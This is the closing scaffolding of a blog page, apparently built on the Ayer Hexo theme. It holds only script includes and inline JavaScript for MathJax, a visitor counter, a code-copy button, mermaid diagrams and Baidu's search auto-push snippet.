      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
  var ayerConfig = {
    mathjax: true
  }
</script>

<!-- Katex -->

<!-- busuanzi  -->


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->


<script src="/js/clickBoom2.js"></script>


<!-- CodeCopy -->


<link rel="stylesheet" href="/css/clipboard.css">

<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>


<!-- CanvasBackground -->


<script src="/js/dz.js"></script>


<!-- mermaid -->

  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize({theme: 'forest'});
    }
  </script>

<!-- baiduSpider auto push -->

  <script>
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https'){
       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else{
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
    </script>


    
  </div>
</body>

</html>